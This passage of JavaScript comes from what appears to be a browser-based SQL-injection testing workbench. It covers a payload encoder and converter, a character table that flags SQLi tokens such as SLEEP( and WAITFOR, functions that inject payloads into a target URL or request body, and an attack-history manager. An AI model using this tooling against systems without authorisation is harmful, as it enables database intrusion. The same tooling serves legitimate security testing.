      slate:   { primary: '#0f1115', secondary: '#151820', tertiary: '#1c2030', elevated: '#262b3a', input: '#12151c' },
      navy:    { primary: '#0a0e1a', secondary: '#0f1524', tertiary: '#151d30', elevated: '#1e2840', input: '#0c1220' },
      olive:   { primary: '#0e100c', secondary: '#141712', tertiary: '#1a1e16', elevated: '#242a1e', input: '#12150f' },
    };

    function loadAppearance() {
      try {
        return JSON.parse(localStorage.getItem(APPEAR_KEY) || '{}');
      } catch { return {}; }
    }

    function saveAppearance(cfg) {
      try { localStorage.setItem(APPEAR_KEY, JSON.stringify(cfg)); } catch {}
    }

    function applyAppearance(cfg) {
      const root = document.documentElement;
      const accent = cfg.accent || '#6c5ce7';
      root.style.setProperty('--accent', accent);
      root.style.setProperty('--accent-dim', accent);
      root.style.setProperty('--accent-bright', accent);
      // derive a lighter bright variant roughly
      root.style.setProperty('--accent-bright', accent);

      const bg = BG_PRESETS[cfg.bg] || BG_PRESETS.default;
      root.style.setProperty('--bg-primary', bg.primary);
      root.style.setProperty('--bg-secondary', bg.secondary);
      root.style.setProperty('--bg-tertiary', bg.tertiary);
      root.style.setProperty('--bg-elevated', bg.elevated);
      root.style.setProperty('--bg-input', bg.input);

      const scale = cfg.scale || 100;
      document.body.style.zoom = scale === 100 ? '' : (scale / 100);

      const radius = cfg.radius != null ? cfg.radius : 6;
      root.style.setProperty('--radius', radius + 'px');

      const mono = cfg.monoSize || 13;
      root.style.setProperty('--mono-size', mono + 'px');

      // density
      if (cfg.density === 'compact') {
        document.body.classList.add('density-compact');
      } else {
        document.body.classList.remove('density-compact');
      }

      // sync controls if present
      const accentEl = $('#appearAccent');
      if (accentEl) accentEl.value = accent;
      const bgEl = $('#appearBg');
      if (bgEl) bgEl.value = cfg.bg || 'default';
      const scaleEl = $('#appearScale');
      if (scaleEl) scaleEl.value = scale;
      const scaleLabel = $('#appearScaleLabel');
      if (scaleLabel) scaleLabel.textContent = scale + '%';
      const densEl = $('#appearDensity');
      if (densEl) densEl.value = cfg.density || 'comfortable';
      const radEl = $('#appearRadius');
      if (radEl) radEl.value = String(radius);
      const monoEl = $('#appearMonoSize');
      if (monoEl) monoEl.value = String(mono);
      $$('.appear-preset').forEach((b) => {
        b.classList.toggle('active', b.dataset.color === accent);
      });
    }

    function initAppearanceControls() {
      let cfg = loadAppearance();
      applyAppearance(cfg);

      const persist = () => {
        cfg = {
          accent: $('#appearAccent')?.value || cfg.accent,
          bg: $('#appearBg')?.value || cfg.bg,
          scale: +($('#appearScale')?.value || cfg.scale || 100),
          density: $('#appearDensity')?.value || cfg.density,
          radius: +($('#appearRadius')?.value || cfg.radius || 6),
          monoSize: +($('#appearMonoSize')?.value || cfg.monoSize || 13),
        };
        saveAppearance(cfg);
        applyAppearance(cfg);
      };

      ['appearAccent', 'appearBg', 'appearScale', 'appearDensity', 'appearRadius', 'appearMonoSize'].forEach((id) => {
        const el = $('#' + id);
        if (!el) return;
        el.addEventListener('input', persist);
        el.addEventListener('change', persist);
      });
      $$('.appear-preset').forEach((btn) => {
        btn.addEventListener('click', () => {
          const accentEl = $('#appearAccent');
          if (accentEl) accentEl.value = btn.dataset.color;
          persist();
        });
      });
      const resetBtn = $('#appearResetBtn');
      if (resetBtn) {
        resetBtn.addEventListener('click', () => {
          cfg = {};
          saveAppearance(cfg);
          applyAppearance(cfg);
          showToast('Appearance reset', 'success');
        });
      }
    }

    // ===== Payload Utils (line-by-line + selection-aware) =====
    function mapPayloadText(text, fn) {
      return String(text || '').split('\n').map((line) => {
        try { return fn(line); } catch { return line; }
      }).join('\n');
    }
    function applyToPayloadOrSelection(fn, okMsg) {
      if (!payloadInput) return;
      const start = payloadInput.selectionStart;
      const end = payloadInput.selectionEnd;
      const val = payloadInput.value;
      if (start !== end) {
        const sel = val.slice(start, end);
        const out = mapPayloadText(sel, fn);
        payloadInput.value = val.slice(0, start) + out + val.slice(end);
        payloadInput.setSelectionRange(start, start + out.length);
      } else {
        if (!val) return;
        payloadInput.value = mapPayloadText(val, fn);
      }
      if (typeof updatePayloadSummary === 'function') updatePayloadSummary();
      if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
      showToast(okMsg || 'Done', 'success');
    }
    urlEncodeBtn.addEventListener('click', () => {
      applyToPayloadOrSelection(
        (line) => encodeURIComponent(line).replace(/%20/g, '+'),
        'URL Encoded'
      );
    });
    urlDecodeBtn.addEventListener('click', () => {
      applyToPayloadOrSelection(
        (line) => decodeURIComponent(String(line).replace(/\+/g, ' ')),
        'URL Decoded'
      );
    });
    clearPayloadBtn.addEventListener('click', () => { payloadInput.value = ''; payloadInput.focus(); });

    // ===== Converter (overlay on Payload) =====
    let converterCodec = 'url';
    const converterEncoders = {
      url: {
        enc: (s) => encodeURIComponent(s).replace(/%20/g, '+'),
        dec: (s) => decodeURIComponent(String(s).replace(/\+/g, ' ')),
      },
      b64: {
        enc: (s) => btoa(unescape(encodeURIComponent(s))),
        dec: (s) => decodeURIComponent(escape(atob(s.trim()))),
      },
      hex: {
        enc: (s) => Array.from(new TextEncoder().encode(s)).map(b => b.toString(16).padStart(2, '0')).join(''),
        dec: (s) => {
          const clean = String(s).replace(/[^0-9a-fA-F]/g, '');
          if (!clean) return '';
          const pairs = clean.match(/.{1,2}/g) || [];
          const bytes = new Uint8Array(pairs.map(h => parseInt(h, 16)));
          return new TextDecoder().decode(bytes);
        },
      },
      html: {
        enc: (s) => s.replace(/[&<>"']/g, (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])),
        dec: (s) => { const d = document.createElement('textarea'); d.innerHTML = s; return d.value; },
      },
      unicode: {
        enc: (s) => Array.from(s).map(ch => {
          const cp = ch.codePointAt(0);
          return cp > 0xFFFF ? '\\u{' + cp.toString(16) + '}' : '\\u' + cp.toString(16).padStart(4, '0');
        }).join(''),
        dec: (s) => String(s).replace(/\\u\{([0-9a-fA-F]+)\}|\\u([0-9a-fA-F]{4})/g, (_, a, b) => {
          return String.fromCodePoint(parseInt(a || b, 16));
        }),
      },
      ascii: {
        enc: (s) => Array.from(s).map(ch => ch.codePointAt(0)).join(' '),
        dec: (s) => String(s).trim().split(/\s+/).filter(Boolean).map(n => String.fromCodePoint(parseInt(n, 10))).join(''),
      },
      rot13: {
        enc: (s) => s.replace(/[A-Za-z]/g, (c) => {
          const base = c <= 'Z' ? 65 : 97;
          return String.fromCharCode((c.charCodeAt(0) - base + 13) % 26 + base);
        }),
        dec: null, // same as enc
      },
      reverse: {
        enc: (s) => Array.from(s).reverse().join(''),
        dec: null,
      },
    };
    function runConverter(direction) {
      const input = $('#converterInput');
      const output = $('#converterOutput');
      if (!input || !output) return;
      const pair = converterEncoders[converterCodec];
      if (!pair) return;
      let fn = direction === 'dec' ? (pair.dec || pair.enc) : pair.enc;
      if (!fn) return;
      try {
        const start = input.selectionStart;
        const end = input.selectionEnd;
        let source;
        if (start !== end) {
          // Only selected slice (like Payload Workbench)
          source = input.value.slice(start, end);
        } else {
          source = input.value;
        }
        output.value = mapPayloadText(source, fn);
      } catch (err) {
        showToast('Convert failed: ' + (err.message || err));
      }
    }
    function openConverter() {
      const input = $('#converterInput');
      if (payloadInput && payloadInput.selectionStart !== payloadInput.selectionEnd) {
        input.value = payloadInput.value.slice(payloadInput.selectionStart, payloadInput.selectionEnd);
      } else if (input && !input.value && payloadInput) {
        input.value = payloadInput.value;
      }
      if (typeof openVPanel === 'function') openVPanel('converter');
      else $('#converterPanel')?.classList.add('open');
      setTimeout(() => input?.focus(), 50);
    }
    function closeConverter() {
      if (typeof closeVPanel === 'function') closeVPanel('converter');
      else $('#converterPanel')?.classList.remove('open');
    }
    (function bindConverter() {
      const btn = $('#converterBtn');
      if (btn) btn.addEventListener('click', (e) => { e.stopPropagation(); openConverter(); });
      $$('#converterModes .conv-mode').forEach((b) => {
        b.addEventListener('click', () => {
          $$('#converterModes .conv-mode').forEach((x) => x.classList.remove('active'));
          b.classList.add('active');
          converterCodec = b.dataset.codec || 'url';
        });
      });
      $('#converterEncode')?.addEventListener('click', () => runConverter('enc'));
      $('#converterDecode')?.addEventListener('click', () => runConverter('dec'));
      $('#converterFromPayload')?.addEventListener('click', () => {
        const input = $('#converterInput');
        if (!input || !payloadInput) return;
        if (payloadInput.selectionStart !== payloadInput.selectionEnd) {
          input.value = payloadInput.value.slice(payloadInput.selectionStart, payloadInput.selectionEnd);
        } else {
          input.value = payloadInput.value;
        }
      });
      $('#converterSwap')?.addEventListener('click', () => {
        const a = $('#converterInput');
        const b = $('#converterOutput');
        if (!a || !b) return;
        const t0 = a.value;
        a.value = b.value;
        b.value = t0;
      });
      $('#converterToPayload')?.addEventListener('click', () => {
        const out = ($('#converterOutput')?.value) ?? '';
        if (!payloadInput) return;
        const start = payloadInput.selectionStart;
        const end = payloadInput.selectionEnd;
        if (start !== end) {
          payloadInput.value = payloadInput.value.slice(0, start) + out + payloadInput.value.slice(end);
          payloadInput.setSelectionRange(start, start + out.length);
        } else {
          payloadInput.value = out;
        }
        if (typeof updatePayloadSummary === 'function') updatePayloadSummary();
        if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
        closeConverter();
        showToast('Applied to Payload', 'success');
      });
      $('#converterAsLine')?.addEventListener('click', () => {
        const out = ($('#converterOutput')?.value) ?? '';
        if (!out || !payloadInput) return;
        const cur = payloadInput.value || '';
        payloadInput.value = cur && !cur.endsWith('\n') ? (cur + '\n' + out) : (cur + out);
        if (typeof updatePayloadSummary === 'function') updatePayloadSummary();
        if (typeof refreshAttackPanel === 'function') refreshAttackPanel();
        showToast('Appended as new line(s)', 'success');
      });
      $('#converterCopy')?.addEventListener('click', async () => {
        const out = ($('#converterOutput')?.value) ?? '';
        try {
          await navigator.clipboard.writeText(out);
          showToast('Copied', 'success');
        } catch {
          showToast('Copy failed');
        }
      });
    })();

    // ===== Char Tables (unified + search + copy pop) =====
    const SQLI_HOT = new Set(["'", '"', '#', '-', '/', '*', '(', ')', ';', '=', ' ', '%', '_', '\\', ',', '|', '&', '<', '>', '`']);
    function buildUnifiedCharRows() {
      const rows = [];
      // Printable ASCII 32-126
      for (let i = 32; i <= 126; i++) {
        const ch = String.fromCharCode(i);
        const url = encodeURIComponent(ch).replace(/%20/g, '+');
        rows.push({
          char: ch === ' ' ? '␠' : ch,
          rawChar: ch,
          ascii: String(i),
          url,
          hex: i.toString(16).toUpperCase().padStart(2, '0'),
          hot: SQLI_HOT.has(ch),
        });
      }
      // Common SQLi multi-char tokens
      const extras = ['-- ', '/*', '*/', '@@', '||', '&&', '0x', 'CHAR(', 'SLEEP(', 'WAITFOR', 'pg_sleep'];
      extras.forEach((tok) => {
        rows.push({
          char: tok,
          rawChar: tok,
          ascii: Array.from(tok).map(c => c.codePointAt(0)).join(' '),
          url: encodeURIComponent(tok).replace(/%20/g, '+'),
          hex: Array.from(new TextEncoder().encode(tok)).map(b => b.toString(16).padStart(2, '0')).join(''),
          hot: true,
        });
      });
      return rows;
    }
    const UNIFIED_CHAR_ROWS = buildUnifiedCharRows();
    let charTableFilter = '';

    function renderCharTable() {
      const panel = $('#charTablePanel');
      const grid = $('#charTableGrid');
      if (!panel || !grid) return;
      const q = (charTableFilter || '').trim().toLowerCase();
      const rows = UNIFIED_CHAR_ROWS.filter((r) => {
        if (!q) return true;
        return (
          r.char.toLowerCase().includes(q) ||
          r.rawChar.toLowerCase().includes(q) ||
          r.ascii.includes(q) ||
          r.url.toLowerCase().includes(q) ||
          r.hex.toLowerCase().includes(q)
        );
      });
      grid.innerHTML = rows.map((r, idx) => `
        <button type="button" class="char-cell${r.hot ? ' sqli-hot' : ''}" data-idx="${idx}" data-char="${escapeHtml(r.rawChar)}" data-ascii="${escapeHtml(r.ascii)}" data-url="${escapeHtml(r.url)}" data-hex="${escapeHtml(r.hex)}" title="Click to copy…">
          <span class="ch-char">${escapeHtml(r.char)}</span>
          <span class="ch-enc-row">
            <span class="ch-ascii">ASCII ${escapeHtml(r.ascii)}</span>
            <span class="ch-enc">URL ${escapeHtml(r.url)}</span>
          </span>
        </button>
      `).join('') || '<div class="cheat-empty">No matches</div>';
      grid.querySelectorAll('.char-cell').forEach((btn) => {
        btn.addEventListener('click', (e) => {
          e.stopPropagation();
          openCharCopyPop(btn);
        });
      });
      panel.classList.remove('hidden');
    }

    function openCharCopyPop(btn) {
      const pop = $('#charCopyPop');
      const actions = $('#charCopyPopActions');
      const title = $('#charCopyPopTitle');
      if (!pop || !actions) return;
      const ch = btn.dataset.char || '';
      const ascii = btn.dataset.ascii || '';
      const url = btn.dataset.url || '';
      const hex = btn.dataset.hex || '';
      if (title) title.textContent = 'Copy · ' + (ch === ' ' ? 'space' : ch);
      const opts = [
        { label: 'Character', val: ch },
        { label: 'ASCII', val: ascii },
        { label: 'URL encode', val: url },
        { label: 'Hex', val: hex },
      ];
      actions.innerHTML = opts.map((o) =>
        `<button type="button" data-val="${escapeHtml(o.val)}"><strong>${escapeHtml(o.label)}</strong> · <code>${escapeHtml(o.val)}</code></button>`
      ).join('');
      actions.querySelectorAll('button').forEach((b) => {
        b.addEventListener('click', async (e) => {
          e.stopPropagation();
          try {
            await navigator.clipboard.writeText(b.dataset.val || '');
            showToast('Copied', 'success');
          } catch { showToast('Copy failed'); }
          pop.classList.add('hidden');
        });
      });
      // Fixed position near cell (avoids clipped scroll areas)
      const br = btn.getBoundingClientRect();
      pop.classList.remove('hidden');
      const pw = pop.offsetWidth || 200;
      const ph = pop.offsetHeight || 160;
      let top = br.top - ph - 8;
      if (top < 8) top = br.bottom + 8;
      let left = br.left;
      if (left + pw > window.innerWidth - 8) left = window.innerWidth - pw - 8;
      pop.style.top = top + 'px';
      pop.style.left = Math.max(8, left) + 'px';
    }

    (function bindCharTable() {
      const badge = $('#charTableBadge');
      const panel = $('#charTablePanel');
      if (badge && panel) {
        badge.addEventListener('click', (e) => {
          e.stopPropagation();
          const wrap = $('#charTableWrap');
          if (!panel.classList.contains('hidden')) {
            panel.classList.add('hidden');
            wrap?.classList.remove('open');
            $('#charCopyPop')?.classList.add('hidden');
            return;
          }
          charTableFilter = ($('#charTableSearch')?.value) || '';
          renderCharTable();
          wrap?.classList.add('open');
        });
      }
      $('#charTableClose')?.addEventListener('click', () => {
        panel?.classList.add('hidden');
        $('#charTableWrap')?.classList.remove('open');
        $('#charCopyPop')?.classList.add('hidden');
      });
      $('#charCopyPopClose')?.addEventListener('click', () => {
        $('#charCopyPop')?.classList.add('hidden');
      });
      $('#charTableSearch')?.addEventListener('input', (e) => {
        charTableFilter = e.target.value || '';
        renderCharTable();
      });
    })();

    // Tools search / filter (history-style)
    // Tools list — search only (no category chips)
    (function bindToolsListSearch() {
      const search = $('#toolsSearch');
      const list = $('#toolsPickerList');
      if (!list) return;
      const apply = () => {
        const q = ((search && search.value) || '').trim().toLowerCase();
        list.querySelectorAll('.tools-list-item, .tools-picker-item').forEach((el) => {
          const text = (el.textContent || '').toLowerCase();
          const qOk = !q || text.includes(q);
          el.classList.toggle('hidden', !qOk);
          el.style.display = qOk ? '' : 'none';
        });
      };
      if (search) search.addEventListener('input', apply);
    })();



    // Show / hide Request Body section based on HTTP method
    function updateBodyVisibility() {
      const m = methodSelect.value;
      if (['POST', 'PUT', 'PATCH'].includes(m)) {
        postBodySection.style.display = 'block';
      } else {
        postBodySection.style.display = 'none';
      }
    }
    methodSelect.addEventListener('change', updateBodyVisibility);
    updateBodyVisibility(); // initial

    // Inject SQLi payload into URL (for GET)
    injectBtn.addEventListener('click', () => {
      const payload = payloadInput.value.trim();
      if (!payload) { showToast('Payload is empty'); return; }
      const method = methodSelect.value;

      // If POST/PUT → prefer injecting into body
      if (['POST', 'PUT', 'PATCH'].includes(method)) {
        injectPayloadIntoBody();
        return;
      }

      let url = urlInput.value.trim();
      if (!url) { showToast('Set a target URL first'); return; }
      try {
        if (url.includes('?')) {
          const [base, qs] = url.split('?');
          const params = qs.split('&');
          if (params.length && params[params.length - 1].includes('=')) {
            const key = params[params.length - 1].split('=')[0];
            params[params.length - 1] = key + '=' + payload;
            url = base + '?' + params.join('&');
          } else {
            url = url + (url.endsWith('&') || url.endsWith('?') ? '' : '&') + 'id=' + payload;
          }
        } else {
          url = url + '?id=' + payload;
        }
        urlInput.value = url;
        showToast('Payload injected into URL', 'success');
      } catch { showToast('Injection failed'); }
    });

    // Inject SQLi payload into POST body (replace last param value or append)
    function injectPayloadIntoBody() {
      const payload = payloadInput.value.trim();
      if (!payload) { showToast('Payload is empty'); return; }
      let body = postBodyInput.value.trim();

      if (!body) {
        // Empty body → start with a common param
        postBodyInput.value = 'id=' + payload;
        showToast('Payload set as body (id=...)', 'success');
        return;
      }

      // If body looks like application/x-www-form-urlencoded
      if (body.includes('=') && !body.trimStart().startsWith('{') && !body.trimStart().startsWith('[')) {
        const parts = body.split('&');
        if (parts.length && parts[parts.length - 1].includes('=')) {
          const key = parts[parts.length - 1].split('=')[0];
          parts[parts.length - 1] = key + '=' + payload;
          postBodyInput.value = parts.join('&');
        } else {
          postBodyInput.value = body + (body.endsWith('&') ? '' : '&') + 'id=' + payload;
        }
        showToast('Payload injected into Body (form)', 'success');
      } else {
        // Raw / JSON body → append payload at the end
        postBodyInput.value = body + payload;
        showToast('Payload appended to Body', 'success');
      }
    }

    injectIntoBodyBtn.addEventListener('click', injectPayloadIntoBody);
    clearBodyBtn.addEventListener('click', () => {
      postBodyInput.value = '';
      postBodyInput.focus();
    });

    // ===== History: Render + Delete + Rename + Pin + Drag =====
    function getSortedHistory() {
      // Pinned first (preserve relative order), then the rest
      const pinned = state.history.filter(h => h.pinned);
      const unpinned = state.history.filter(h => !h.pinned);
      return [...pinned, ...unpinned];
    }

    function getUrlPath(url) {
      try {
        const u = new URL(url);
        let path = u.pathname || '/';
        if (u.search) path += u.search;
        return path.length > 48 ? path.slice(0, 46) + '…' : path;
      } catch {
        return (url || '').slice(0, 48);
      }
    }

    function formatBytes(n) {
      n = Number(n) || 0;
      if (n < 1024) return n + ' B';
      if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
      return (n / (1024 * 1024)).toFixed(1) + ' MB';
    }

    function formatRelativeTime(ts) {
      const diff = Math.max(0, Date.now() - ts);
      const sec = Math.floor(diff / 1000);
      if (sec < 5) return 'just now';
      if (sec < 60) return sec + 's ago';
      const min = Math.floor(sec / 60);
      if (min < 60) return min + 'm ago';
      const hr = Math.floor(min / 60);
      if (hr < 24) return hr + 'h ago';
      const days = Math.floor(hr / 24);
      return days + 'd ago';
    }

    function formatExactTime(ts) {
      try {
        return new Date(ts).toLocaleString();
      } catch {
        return '';
      }
    }

    function matchesStatusFilter(item, filter) {
      if (filter === 'all') return true;
      if (filter === 'starred') return !!item.pinned;
      if (filter === 'batch') {
        // Multi-select attack filter
        const selected = state.selectedBatchIds || [];
        if (selected.length) return selected.includes(item.batchId);
        return !!item.batchId;
      }
      if (filter === 'single') return !item.batchId;
      if (filter && filter.startsWith('batch:')) {
        return item.batchId === filter.slice(6);
      }
      const status = item.response.status;
      if (filter === '0') return status === 0;
      if (filter === '2xx') return status >= 200 && status < 300;
      if (filter === '3xx') return status >= 300 && status < 400;
      if (filter === '4xx') return status >= 400 && status < 500;
      if (filter === '5xx') return status >= 500;
      return true;
    }

    function getKnownAttacks() {
      // Count ONLY from history (once). Names from attackSources / batchName.
      const map = {};
      Object.entries(state.attackSources || {}).forEach(([id, src]) => {
        map[id] = { id, name: (src && src.name) || id, count: 0 };
      });
      state.history.forEach((h) => {
        if (!h.batchId) return;
        if (!map[h.batchId]) {
          map[h.batchId] = { id: h.batchId, name: h.batchName || h.batchId, count: 0 };
        }
        map[h.batchId].count += 1;
        if (h.batchName) map[h.batchId].name = h.batchName;
      });
      const activeBatch = (state.attack && state.attack.active) ? state.attack.batchId : null;
      // Purge empty attackSources from state (except in-flight attack)
      Object.keys(state.attackSources || {}).forEach((id) => {
        if (id === activeBatch) return;
        if (!map[id] || map[id].count === 0) {
          delete state.attackSources[id];
          if (state.collapsedBatches) delete state.collapsedBatches[id];
          state.selectedBatchIds = (state.selectedBatchIds || []).filter((x) => x !== id);
          delete map[id];
        }
      });
      return Object.values(map)
        .filter((a) => a.count > 0 || a.id === activeBatch)
        .sort((a, b) => (b.count - a.count) || String(a.name).localeCompare(String(b.name)));
    }

    function openAttackPicker() {
      const ov = $('#atkPickerOverlay');
      const list = $('#atkPickerList');
      if (!ov || !list) return;
      const attacks = getKnownAttacks();
      if (!attacks.length) {
        showToast('No attacks in history yet');
        return;
      }
      const selected = new Set(state.selectedBatchIds || []);
      list.innerHTML = attacks.map(a => `
        <div class="atk-picker-item${selected.has(a.id) ? ' selected' : ''}" data-id="${escapeHtml(a.id)}">
          <input type="checkbox" ${selected.has(a.id) ? 'checked' : ''} />
          <span class="atk-name" title="${escapeHtml(a.name)}">⚡ ${escapeHtml(a.name)}</span>
          <span class="atk-meta">${a.count} req</span>
          <button type="button" class="atk-del" data-del="${escapeHtml(a.id)}" title="Delete attack">×</button>
        </div>
      `).join('');
      list.querySelectorAll('.atk-picker-item').forEach(el => {
        const cb = el.querySelector('input');
        const sync = () => el.classList.toggle('selected', cb.checked);
        cb.addEventListener('change', sync);
        el.addEventListener('click', (e) => {
          if (e.target.closest('input, button')) return;
          e.preventDefault();
          cb.checked = !cb.checked;
          sync();
        });
        el.querySelector('.atk-del')?.addEventListener('click', (e) => {
          e.stopPropagation();
          deleteAttackById(el.dataset.id);
        });
      });
      ov.classList.add('open');
    }

    function deleteAttackById(batchId) {
      if (!batchId) return;
      const name = state.attackSources?.[batchId]?.name
        || state.history.find(h => h.batchId === batchId)?.batchName
        || batchId;
      const count = state.history.filter(h => h.batchId === batchId).length;
      if (!confirm(`Delete attack "${name}" and its ${count} request(s)?`)) return;
      state.history = state.history.filter(h => h.batchId !== batchId);
      if (state.attackSources) delete state.attackSources[batchId];
      if (state.collapsedBatches) delete state.collapsedBatches[batchId];
      state.selectedBatchIds = (state.selectedBatchIds || []).filter(id => id !== batchId);
      if (state.activeHistoryId && !state.history.some(h => h.id === state.activeHistoryId)) {
        state.activeHistoryId = null;
      }
      renderHistory();
      renderHfChips();
      if (typeof scheduleHistorySave === 'function') scheduleHistorySave();
      // Refresh picker if still open
      const ov = $('#atkPickerOverlay');
      if (ov && ov.classList.contains('open')) {
        const left = getKnownAttacks();
        if (!left.length) closeAttackPicker();
        else openAttackPicker();
      }
      showToast('Attack deleted', 'success');
    }

    function deleteSelectedAttacks() {
      const list = $('#atkPickerList');
      if (!list) return;
      const ids = [...list.querySelectorAll('.atk-picker-item')].filter(el => el.querySelector('input')?.checked).map(el => el.dataset.id);
      if (!ids.length) {
        showToast('Select attacks to delete');
        return;
      }
      const totalReq = state.history.filter(h => ids.includes(h.batchId)).length;
      if (!confirm(`Delete ${ids.length} attack(s) and ${totalReq} request(s)?`)) return;
      ids.forEach((batchId) => {
        state.history = state.history.filter(h => h.batchId !== batchId);
        if (state.attackSources) delete state.attackSources[batchId];
        if (state.collapsedBatches) delete state.collapsedBatches[batchId];
      });
      state.selectedBatchIds = (state.selectedBatchIds || []).filter(id => !ids.includes(id));
      if (state.activeHistoryId && !state.history.some(h => h.id === state.activeHistoryId)) {
        state.activeHistoryId = null;
      }
      renderHistory();
      renderHfChips();
      if (typeof scheduleHistorySave === 'function') scheduleHistorySave();
      const left = getKnownAttacks();
      if (!left.length) closeAttackPicker();
      else openAttackPicker();
      showToast('Selected attacks deleted', 'success');
    }

    function closeAttackPicker() {
      $('#atkPickerOverlay')?.classList.remove('open');
    }

    function applyAttackPicker() {
      const list = $('#atkPickerList');
      if (!list) return;
      const ids = [...list.querySelectorAll('.atk-picker-item')].filter(el => el.querySelector('input')?.checked).map(el => el.dataset.id);
      state.selectedBatchIds = ids;
      state.hfActive = 'batch';
      state.historyStatusFilter = 'batch';
      if (historyStatusFilter) historyStatusFilter.value = 'batch';
      closeAttackPicker();
      renderHfChips();
      renderHistory();
      showToast(ids.length ? `Showing ${ids.length} attack(s)` : 'Showing all attacks', 'success');
    }

    // Attack picker buttons
    (function bindAttackPicker() {
      $('#atkPickerApply')?.addEventListener('click', applyAttackPicker);
      $('#atkPickerCancel')?.addEventListener('click', closeAttackPicker);
      $('#atkPickerClose')?.addEventListener('click', closeAttackPicker);
      $('#atkPickerSelectAll')?.addEventListener('click', () => {
        $$('#atkPickerList input[type=checkbox]').forEach(cb => {
          cb.checked = true;
          cb.closest('.atk-picker-item')?.classList.add('selected');
        });
      });
      $('#atkPickerSelectNone')?.addEventListener('click', () => {
        $$('#atkPickerList input[type=checkbox]').forEach(cb => {
          cb.checked = false;
          cb.closest('.atk-picker-item')?.classList.remove('selected');
        });
      });
      $('#atkPickerDeleteSelected')?.addEventListener('click', deleteSelectedAttacks);
    })();

    // ===== Advanced History Filter Engine =====
    const HF_RULES_KEY = 'sqli-workbench-hf-rules';

    // History action icons (SVG — not emoji)
    const HIST_ICO = {
      gear: '<svg class="hi" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M19.14 12.94c.04-.31.06-.63.06-.94s-.02-.63-.06-.94l2.03-1.58a.5.5 0 0 0 .12-.64l-1.92-3.32a.5.5 0 0 0-.6-.22l-2.39.96a7.07 7.07 0 0 0-1.63-.94l-.36-2.54A.5.5 0 0 0 14.3 2h-4.6a.5.5 0 0 0-.49.42l-.36 2.54c-.6.24-1.14.55-1.63.94l-2.39-.96a.5.5 0 0 0-.6.22L2.3 8.48a.5.5 0 0 0 .12.64l2.03 1.58c-.04.31-.06.63-.06.94s.02.63.06.94L2.42 14.6a.5.5 0 0 0-.12.64l1.92 3.32c.14.24.43.34.68.22l2.39-.96c.49.39 1.03.7 1.63.94l.36 2.54c.05.24.25.42.49.42h4.6c.24 0 .44-.18.49-.42l.36-2.54c.6-.24 1.14-.55 1.63-.94l2.39.96c.25.12.54.02.68-.22l1.92-3.32a.5.5 0 0 0-.12-.64l-2.03-1.58zM12 15.5A3.5 3.5 0 1 1 12 8.5a3.5 3.5 0 0 1 0 7z"/></svg>',
      star: '<svg class="hi" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 2.5l2.9 5.88 6.49.94-4.7 4.58 1.11 6.47L12 17.77l-5.8 3.05 1.11-6.47-4.7-4.58 6.49-.94L12 2.5z"/></svg>',
      starOut: '<svg class="hi" viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.7" d="M12 3.2l2.6 5.27 5.82.85-4.21 4.1 1 5.8L12 16.5l-5.21 2.72 1-5.8-4.21-4.1 5.82-.85L12 3.2z"/></svg>',
      trash: '<svg class="hi" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M9 3h6l1 2h4v2H4V5h4l1-2zm1 6h2v9h-2V9zm4 0h2v9h-2V9zM7 9h2v9H7V9zm-1 12h12a1 1 0 0 0 1-1V7H5v13a1 1 0 0 0 1 1z"/></svg>',
      download: '<svg class="hi" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M11 3h2v10.2l3.1-3.1 1.4 1.4L12 17l-5.5-5.5 1.4-1.4L11 13.2V3zM5 19h14v2H5v-2z"/></svg>',
      note: '<svg class="hi" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5 3h11l3 3v15H5V3zm10 1.5V7h2.5L15 4.5zM7 10h10v2H7v-2zm0 4h10v2H7v-2zm0 4h7v2H7v-2z"/></svg>',
      code: '<svg class="hi" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M8.1 16.9L3.2 12l4.9-4.9 1.4 1.4L6 12l3.5 3.5-1.4 1.4zm7.8 0l-1.4-1.4L18 12l-3.5-3.5 1.4-1.4 4.9 4.9-4.9 4.9z"/></svg>',
      globe: '<svg class="hi" viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm7.4 9h-3.1a15 15 0 0 0-1.3-5.3A8 8 0 0 1 19.4 11zM12 4c.9 0 2.3 2.1 3 5H9c.7-2.9 2.1-5 3-5zM4.6 13h3.1c.2 1.9.7 3.7 1.3 5.3A8 8 0 0 1 4.6 13zm3.1-2H4.6a8 8 0 0 1 4.4-5.3A15 15 0 0 0 7.7 11zM12 20c-.9 0-2.3-2.1-3-5h6c-.7 2.9-2.1 5-3 5zm2.3-1.7c.6-1.6 1.1-3.4 1.3-5.3h3.1a8 8 0 0 1-4.4 5.3zM9.9 13c.2 1.9.7 3.6 1.3 5h1.6c.6-1.4 1.1-3.1 1.3-5H9.9z"/></svg>',
    };

    const HF_PRESETS = [
      { id: 'all', label: 'All', cls: 'chip-all' },
      { id: 'starred', label: '★ Star', cls: 'chip-star' },
      { id: '2xx', label: '2xx', cls: 'chip-2xx' },
      { id: '3xx', label: '3xx', cls: 'chip-3xx' },
      { id: '4xx', label: '4xx', cls: 'chip-4xx' },
      { id: '5xx', label: '5xx', cls: 'chip-5xx' },
      { id: '0', label: 'ERR', cls: 'chip-err' },
      { id: 'batch', label: '⚡ Attacks', cls: 'chip-rule' },
      { id: 'single', label: 'Single', cls: 'chip-rule' },
    ];

    function loadHfRules() {
      try {
        const raw = localStorage.getItem(HF_RULES_KEY);
        const arr = raw ? JSON.parse(raw) : [];
        return Array.isArray(arr) ? arr : [];
      } catch { return []; }
    }
    function saveHfRules(rules) {
      localStorage.setItem(HF_RULES_KEY, JSON.stringify(rules));
    }
    if (!state.hfRules) state.hfRules = loadHfRules();
    if (!state.hfActive) state.hfActive = 'all'; // preset id or rule:<id>
    if (!state.hfDraft) state.hfDraft = emptyHfRule();

    function emptyHfRule() {
      return {
        statusRanges: [],
        statusExact: [],
